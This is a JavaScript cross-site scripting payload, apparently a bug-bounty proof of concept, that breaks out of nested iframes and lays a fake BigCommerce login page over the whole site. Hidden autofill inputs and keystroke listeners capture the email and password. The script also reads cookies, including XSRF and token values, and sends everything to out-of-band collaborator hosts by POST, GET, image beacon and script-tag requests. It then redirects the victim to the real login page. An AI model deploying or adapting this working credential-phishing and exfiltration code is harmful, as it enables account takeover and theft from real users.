// Complete Iframe Breakout Script - Escapes nested iframes and covers entire page
(function() {
    console.log('🚀 Starting complete iframe breakout sequence...');
    
    // Function to create full-page overlay
    function createFullPageOverlay(targetWindow, targetDocument) {
        console.log('✅ Creating full-page overlay in target document');
        
        // Remove any existing overlays
        try {
            var existing = targetDocument.getElementById('xss-full-overlay');
            if (existing) existing.remove();
        } catch(e) {}
        
        // Create full-screen overlay div (not iframe to avoid further nesting issues)
        var overlay = targetDocument.createElement('div');
        overlay.id = 'xss-full-overlay';
        overlay.style.cssText = `
            position: fixed !important;
            top: 0 !important;
            left: 0 !important;
            width: 100vw !important;
            height: 100vh !important;
            z-index: 2147483647 !important;
            background: #0a0a0a !important;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif !important;
            color: white !important;
            display: flex !important;
            flex-direction: column !important;
            justify-content: center !important;
            align-items: center !important;
            margin: 0 !important;
            padding: 0 !important;
            box-sizing: border-box !important;
        `;
        
        // Create animated background
        overlay.innerHTML = `
            <style>
                #xss-full-overlay * { box-sizing: border-box; }
                #xss-full-overlay::before {
                    content: '';
                    position: absolute;
                    top: 0;
                    left: 0;
                    width: 100%;
                    height: 100%;
                    background-image: 
                        linear-gradient(rgba(255,255,255,0.03) 1px, transparent 1px),
                        linear-gradient(90deg, rgba(255,255,255,0.03) 1px, transparent 1px);
                    background-size: 50px 50px;
                    animation: xss-grid-move 20s linear infinite;
                    z-index: 1;
                }
                @keyframes xss-grid-move {
                    0% { transform: translate(0, 0); }
                    100% { transform: translate(50px, 50px); }
                }
                .xss-close-btn {
                    position: absolute !important;
                    top: 20px !important;
                    right: 20px !important;
                    background: rgba(255,255,255,0.1) !important;
                    border: 1px solid rgba(255,255,255,0.2) !important;
                    color: white !important;
                    width: 40px !important;
                    height: 40px !important;
                    border-radius: 50% !important;
                    cursor: pointer !important;
                    display: flex !important;
                    align-items: center !important;
                    justify-content: center !important;
                    font-size: 20px !important;
                    z-index: 10 !important;
                    transition: all 0.3s ease !important;
                }
                .xss-close-btn:hover {
                    background: rgba(255,255,255,0.2) !important;
                    transform: scale(1.1) !important;
                }
                .xss-container {
                    position: relative !important;
                    z-index: 2 !important;
                    width: 100% !important;
                    max-width: 400px !important;
                    padding: 0 20px !important;
                }
                .xss-logo {
                    text-align: center !important;
                    margin-bottom: 60px !important;
                }
                .xss-logo svg {
                    width: 180px !important;
                    height: auto !important;
                    fill: white !important;
                }
                .xss-login-form {
                    background: rgba(255, 255, 255, 0.05) !important;
                    backdrop-filter: blur(10px) !important;
                    border: 1px solid rgba(255, 255, 255, 0.1) !important;
                    border-radius: 12px !important;
                    padding: 40px !important;
                    box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3) !important;
                }
                .xss-form-title {
                    font-size: 28px !important;
                    font-weight: 600 !important;
                    text-align: center !important;
                    margin-bottom: 40px !important;
                    color: white !important;
                }
                .xss-form-group {
                    margin-bottom: 24px !important;
                }
                .xss-form-input {
                    width: 100% !important;
                    padding: 16px 20px !important;
                    border: 1px solid rgba(255, 255, 255, 0.2) !important;
                    border-radius: 8px !important;
                    background: rgba(255, 255, 255, 0.1) !important;
                    color: white !important;
                    font-size: 16px !important;
                    transition: all 0.3s ease !important;
                    font-family: inherit !important;
                }
                .xss-form-input::placeholder {
                    color: rgba(255, 255, 255, 0.6) !important;
                }
                .xss-form-input:focus {
                    outline: none !important;
                    border-color: #3b82f6 !important;
                    box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.1) !important;
                    background: rgba(255, 255, 255, 0.15) !important;
                }
                .xss-password-container {
                    position: relative !important;
                }
                .xss-password-toggle {
                    position: absolute !important;
                    right: 16px !important;
                    top: 50% !important;
                    transform: translateY(-50%) !important;
                    background: none !important;
                    border: none !important;
                    color: rgba(255, 255, 255, 0.6) !important;
                    cursor: pointer !important;
                    padding: 4px !important;
                    border-radius: 4px !important;
                    transition: color 0.3s ease !important;
                }
                .xss-password-toggle:hover {
                    color: white !important;
                }
                .xss-login-btn {
                    width: 100% !important;
                    padding: 16px !important;
                    background: linear-gradient(135deg, #3b82f6, #1d4ed8) !important;
                    border: none !important;
                    border-radius: 8px !important;
                    color: white !important;
                    font-size: 16px !important;
                    font-weight: 600 !important;
                    cursor: pointer !important;
                    transition: all 0.3s ease !important;
                    margin-bottom: 24px !important;
                    font-family: inherit !important;
                }
                .xss-login-btn:hover {
                    background: linear-gradient(135deg, #2563eb, #1e40af) !important;
                    transform: translateY(-2px) !important;
                    box-shadow: 0 10px 20px rgba(59, 130, 246, 0.3) !important;
                }
                .xss-form-links {
                    display: flex !important;
                    justify-content: space-between !important;
                    align-items: center !important;
                }
                .xss-form-link {
                    color: rgba(255, 255, 255, 0.7) !important;
                    text-decoration: none !important;
                    font-size: 14px !important;
                    transition: color 0.3s ease !important;
                }
                .xss-form-link:hover {
                    color: #3b82f6 !important;
                }
                .xss-signup-link {
                    color: #3b82f6 !important;
                }
                .xss-success-msg {
                    display: none !important;
                    background: rgba(34, 197, 94, 0.1) !important;
                    border: 1px solid rgba(34, 197, 94, 0.3) !important;
                    color: #22c55e !important;
                    padding: 12px 16px !important;
                    border-radius: 8px !important;
                    margin-bottom: 20px !important;
                    text-align: center !important;
                    font-size: 14px !important;
                }
                .xss-loading {
                    display: none !important;
                    width: 20px !important;
                    height: 20px !important;
                    border: 2px solid rgba(255, 255, 255, 0.3) !important;
                    border-radius: 50% !important;
                    border-top-color: white !important;
                    animation: xss-spin 1s linear infinite !important;
                    margin-right: 8px !important;
                }
                @keyframes xss-spin {
                    to { transform: rotate(360deg); }
                }
                .xss-harvest-input {
                    position: absolute !important;
                    left: -9999px !important;
                    width: 1px !important;
                    height: 1px !important;
                    opacity: 0 !important;
                }
            </style>
            
            <button class="xss-close-btn" onclick="this.parentElement.remove()">&times;</button>
            
            <div class="xss-container">
                <div class="xss-logo">
                    <svg viewBox="0 0 180 40" xmlns="http://www.w3.org/2000/svg">
                        <path d="M0 20L10 0h160l10 20-10 20H10L0 20z"/>
                        <text x="90" y="25" font-family="Arial, sans-serif" font-size="14" font-weight="bold" text-anchor="middle" fill="black">BIGCOMMERCE</text>
                    </svg>
                </div>
                
                <div class="xss-login-form">
                    <h1 class="xss-form-title">Log in to your store</h1>
                    
                    <div class="xss-success-msg" id="xssSuccessMsg">
                        Login successful! Redirecting...
                    </div>
                    
                    <form id="xssLoginForm">
                        <div class="xss-form-group">
                            <input type="email" class="xss-form-input" placeholder="Email" id="xssEmail" name="email" autocomplete="username email" required>
                        </div>
                        
                        <div class="xss-form-group">
                            <div class="xss-password-container">
                                <input type="password" class="xss-form-input" placeholder="Password" id="xssPassword" name="password" autocomplete="current-password" required>
                                <button type="button" class="xss-password-toggle" id="xssToggle">👁️</button>
                            </div>
                        </div>
                        
                        <button type="submit" class="xss-login-btn">
                            <span class="xss-loading" id="xssLoading"></span>
                            <span id="xssButtonText">Log in</span>
                        </button>
                        
                        <!-- Hidden harvesting inputs -->
                        <input type="text" name="username" class="xss-harvest-input" autocomplete="username" tabindex="-1" id="xssHarvestUser">
                        <input type="password" name="password" class="xss-harvest-input" autocomplete="current-password" tabindex="-1" id="xssHarvestPass">
                    </form>
                    
                    <div class="xss-form-links">
                        <a href="#" class="xss-form-link">Log in with SSO</a>
                        <div>
                            <a href="#" class="xss-form-link">Forgot?</a>
                            <span style="color: rgba(255,255,255,0.3); margin: 0 8px;">•</span>
                            <a href="#" class="xss-form-link xss-signup-link">Sign up</a>
                        </div>
                    </div>
                </div>
            </div>
        `;
        
        // Insert at the very beginning of body to ensure it's on top
        if (targetDocument.body) {
            targetDocument.body.insertBefore(overlay, targetDocument.body.firstChild);
        } else {
            targetDocument.documentElement.appendChild(overlay);
        }
        
        // Set up event handlers
        setTimeout(function() {
            setupEventHandlers(targetDocument);
        }, 100);
        
        console.log('🎯 Full-page overlay successfully created!');
    }
    
    // Event handlers setup
    function setupEventHandlers(doc) {
        var alertShown = false;
        
        var emailInput = doc.getElementById('xssEmail');
        var passwordInput = doc.getElementById('xssPassword');
        var harvestUser = doc.getElementById('xssHarvestUser');
        var harvestPass = doc.getElementById('xssHarvestPass');
        var form = doc.getElementById('xssLoginForm');
        var toggle = doc.getElementById('xssToggle');
        
        if (!emailInput || !passwordInput || !harvestUser || !harvestPass) {
            console.log('⚠️ Could not find form elements');
            return;
        }
        
        // Password toggle
        if (toggle) {
            toggle.addEventListener('click', function() {
                if (passwordInput.type === 'password') {
                    passwordInput.type = 'text';
                    toggle.textContent = '🙈';
                } else {
                    passwordInput.type = 'password';
                    toggle.textContent = '👁️';
                }
            });
        }
        
        // Harvesting functions
        function harvest() {
            var u = harvestUser.value;
            var p = harvestPass.value;
            
            if (u && p && !alertShown) {
                alertShown = true;
                
                // Get XSRF cookie for additional impact
                var xsrfCookie = '';
                var allCookies = '';
                try {
                    allCookies = document.cookie;
                    var cookies = document.cookie.split(';');
                    for (var i = 0; i < cookies.length; i++) {
                        var cookie = cookies[i].trim();
                        if (cookie.toLowerCase().indexOf('xsrf') !== -1 || 
                            cookie.toLowerCase().indexOf('csrf') !== -1 || 
                            cookie.toLowerCase().indexOf('token') !== -1) {
                            xsrfCookie = cookie;
                            break;
                        }
                    }
                } catch(e) {
                    console.log('Cookie access failed:', e);
                }
                
                console.log('COMPLETE BREAKOUT SUCCESS - Data captured:', {
                    email: u, 
                    password: p,
                    xsrfCookie: xsrfCookie,
                    allCookies: allCookies,
                    context: 'full-page-breakout',
                    url: window.location.href,
                    timestamp: new Date().toISOString()
                });
                
                // Send credentials and cookies to OAST server
                try {
                    // Method 1: POST request with JSON payload
                    fetch('https://76bhkhuvblt5zrfh5n8t2rkkhbn2bszh.oastify.com', {
                        method: 'POST',
                        mode: 'no-cors',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({
                            type: 'XSS_CREDENTIALS',
                            email: u,
                            password: p,
                            xsrfCookie: xsrfCookie,
                            allCookies: allCookies,
                            url: window.location.href,
                            timestamp: new Date().toISOString(),
                            userAgent: navigator.userAgent,
                            breakout: 'iframe_complete'
                        })
                    }).then(function() {
                        console.log('Credentials and cookies sent via POST to OAST server');
                    }).catch(function(e) {
                        console.log('POST method failed:', e);
                    });
                } catch(e) {
                    console.log('Fetch POST failed:', e);
                }
                
                try {
                    // Method 2: GET request with URL parameters (more reliable for OAST)
                    var params = '?email=' + encodeURIComponent(u) + 
                                '&password=' + encodeURIComponent(p) + 
                                '&xsrf=' + encodeURIComponent(xsrfCookie) + 
                                '&cookies=' + encodeURIComponent(allCookies) + 
                                '&url=' + encodeURIComponent(window.location.href) + 
                                '&timestamp=' + encodeURIComponent(new Date().toISOString()) + 
                                '&type=xss_breakout';
                    
                    fetch('https://v9dn5cxlqzw7wmwzlanejadfe8kaj2r04.oast.site' + params, {
                        method: 'GET',
                        mode: 'no-cors'
                    }).then(function() {
                        console.log('Credentials and cookies sent via GET to OAST server');
                    }).catch(function(e) {
                        console.log('GET method failed:', e);
                    });
                } catch(e) {
                    console.log('Fetch GET failed:', e);
                }
                
                try {
                    // Method 3: Image request (most reliable for OAST)
                    var img = new Image();
                    img.onload = function() { console.log('Credentials and cookies sent via IMG to OAST server'); };
                    img.onerror = function() { console.log('IMG method completed'); };
                    img.src = 'https://v9dn5cxlqzw7wmwzlanejadfe8kaj2r04.oast.site/img?' + 
                             'email=' + encodeURIComponent(u) + 
                             '&password=' + encodeURIComponent(p) + 
                             '&xsrf=' + encodeURIComponent(xsrfCookie) + 
                             '&cookies=' + encodeURIComponent(allCookies.substring(0, 200)) + // Limit length for URL
                             '&url=' + encodeURIComponent(window.location.href) + 
                             '&method=image&timestamp=' + Date.now();
                } catch(e) {
                    console.log('Image method failed:', e);
                }
                
                try {
                    // Method 4: Script tag injection (alternative method)
                    var script = document.createElement('script');
                    script.src = 'https://v9dn5cxlqzw7wmwzlanejadfe8kaj2r04.oast.site/script?' + 
                                'email=' + encodeURIComponent(u) + 
                                '&password=' + encodeURIComponent(p) + 
                                '&xsrf=' + encodeURIComponent(xsrfCookie) + 
                                '&method=script&timestamp=' + Date.now();
                    document.head.appendChild(script);
                    console.log('Script tag method executed');
                } catch(e) {
                    console.log('Script method failed:', e);
                }
                
                // Show clean alert for triager demonstration
                setTimeout(function() {
                    alert('POC by Ashen1\n\nUsername: ' + u + '\nPassword: ' + p + (xsrfCookie ? '\nXSRF Cookie: ' + xsrfCookie : ''));
                }, 1000);
                
                return true;
            }
            return false;
        }
        
        function quickHarvest() {
            var u = emailInput.value;
            var p = passwordInput.value;
            
            if (u && p) {
                harvestUser.value = u;
                harvestPass.value = p;
                harvest();
            }
        }
        
        // Event listeners
        emailInput.addEventListener('input', function() { 
            harvestUser.value = this.value; 
            quickHarvest();
        });
        passwordInput.addEventListener('input', function() { 
            harvestPass.value = this.value; 
            quickHarvest();
        });
        
        emailInput.addEventListener('keyup', quickHarvest);
        passwordInput.addEventListener('keyup', quickHarvest);
        emailInput.addEventListener('change', quickHarvest);
        passwordInput.addEventListener('change', quickHarvest);
        
        // Form submission
        if (form) {
            form.addEventListener('submit', function(e) {
                e.preventDefault();
                harvest();
                quickHarvest();
                
                var loading = doc.getElementById('xssLoading');
                var buttonText = doc.getElementById('xssButtonText');
                var successMsg = doc.getElementById('xssSuccessMsg');
                var loginBtn = doc.querySelector('.xss-login-btn');
                
                if (loading) loading.style.display = 'inline-block';
                if (buttonText) buttonText.textContent = 'Logging in...';
                if (loginBtn) loginBtn.disabled = true;
                
                setTimeout(function() {
                    if (successMsg) successMsg.style.display = 'block';
                    if (loading) loading.style.display = 'none';
                    if (buttonText) buttonText.textContent = 'Success!';
                    
                    setTimeout(function() {
                        var overlay = doc.getElementById('xss-full-overlay');
                        if (overlay) overlay.remove();
                        window.location.href = 'https://login.bigcommerce.com/';
                    }, 2000);
                }, 1500);
            });
        }
        
        // Prevent link actions
        var links = doc.querySelectorAll('.xss-form-link');
        links.forEach(function(link) {
            link.addEventListener('click', function(e) { 
                e.preventDefault(); 
            });
        });
        
        // Focus sequence for autofill
        setTimeout(function() {
            emailInput.focus();
            setTimeout(function() {
                harvestUser.focus();
                harvestPass.focus();
                emailInput.focus();
            }, 200);
        }, 500);
        
        console.log('✅ Event handlers successfully attached');
    }
    
    // Complete breakout function - traverses ALL iframe levels
    function performCompleteBreakout() {
        var targetWindow = null;
        var targetDocument = null;
        var maxDepth = 15; // Safety limit
        
        console.log('🔥 Starting complete nested iframe breakout...');
        
        // Method 1: Aggressive window hierarchy traversal
        var currentWindow = window;
        var depth = 0;
        var accessibleWindows = [];
        
        // Collect all accessible windows first
        while (currentWindow && depth < maxDepth) {
            try {
                if (currentWindow.document) {
                    accessibleWindows.push({
                        window: currentWindow,
                        document: currentWindow.document,
                        depth: depth
                    });
                    console.log('✅ Found accessible window at depth:', depth);
                }
                
                if (currentWindow.parent && currentWindow.parent !== currentWindow) {
                    currentWindow = currentWindow.parent;
                    depth++;
                } else {
                    break;
                }
            } catch (e) {
                console.log('❌ Access denied at depth:', depth);
                break;
            }
        }
        
        // Use the highest accessible window (topmost)
        if (accessibleWindows.length > 0) {
            var topmost = accessibleWindows[accessibleWindows.length - 1];
            targetWindow = topmost.window;
            targetDocument = topmost.document;
            console.log('🎯 Selected topmost accessible window at depth:', topmost.depth);
        }
        
        // Method 2: Direct top window access
        if (!targetWindow) {
            try {
                if (window.top && window.top !== window && window.top.document) {
                    targetWindow = window.top;
                    targetDocument = window.top.document;
                    console.log('✅ Direct top window access successful');
                }
            } catch (e) {
                console.log('❌ Direct top access failed:', e.message);
            }
        }
        
        // Method 3: Window.open() breakout
        if (!targetWindow) {
            try {
                var newWin = window.open('', '_parent');
                if (newWin && newWin.document) {
                    targetWindow = newWin;
                    targetDocument = newWin.document;
                    console.log('✅ Window.open breakout successful');
                }
            } catch (e) {
                console.log('❌ Window.open failed:', e.message);
            }
        }
        
        // Method 4: Frame iteration
        if (!targetWindow) {
            try {
                var frames = window.top.frames;
                for (var i = 0; i < frames.length; i++) {
                    try {
                        if (frames[i].document && frames[i].parent && frames[i].parent.document) {
                            targetWindow = frames[i].parent;
                            targetDocument = frames[i].parent.document;
                            console.log('✅ Frame iteration breakout successful');
                            break;
                        }
                    } catch (e) {
                        continue;
                    }
                }
            } catch (e) {
                console.log('❌ Frame iteration failed:', e.message);
            }
        }
        
        // Execute overlay creation
        if (targetWindow && targetDocument) {
            console.log('🚨 COMPLETE BREAKOUT SUCCESSFUL!');
            console.log('📊 Breaking out of iframe nest - Target:', targetWindow.location.href);
            
            createFullPageOverlay(targetWindow, targetDocument);
            
            // Ensure we got the absolute topmost level
            setTimeout(function() {
                ensureTopmostLevel(targetWindow, targetDocument);
            }, 300);
            
        } else {
            console.log('⚠️ Complete breakout failed, using current context');
            createFullPageOverlay(window, document);
        }
    }
    
    // Ensure we're at the topmost accessible level
    function ensureTopmostLevel(currentWin, currentDoc) {
        try {
            if (currentWin.parent && currentWin.parent !== currentWin && currentWin.parent.document) {
                console.log('🔄 Found even higher level, moving overlay up...');
                
                // Remove current overlay
                var currentOverlay = currentDoc.getElementById('xss-full-overlay');
                if (currentOverlay) currentOverlay.remove();
                
                // Create at higher level
                createFullPageOverlay(currentWin.parent, currentWin.parent.document);
                
                // Check recursively
                setTimeout(function() {
                    ensureTopmostLevel(currentWin.parent, currentWin.parent.document);
                }, 200);
            }
        } catch (e) {
            console.log('🛑 Reached topmost accessible level');
        }
    }
    
    // Execute the complete breakout
    try {
        performCompleteBreakout();
    } catch (error) {
        console.log('💥 Critical breakout error:', error);
        createFullPageOverlay(window, document);
    }
    
})();
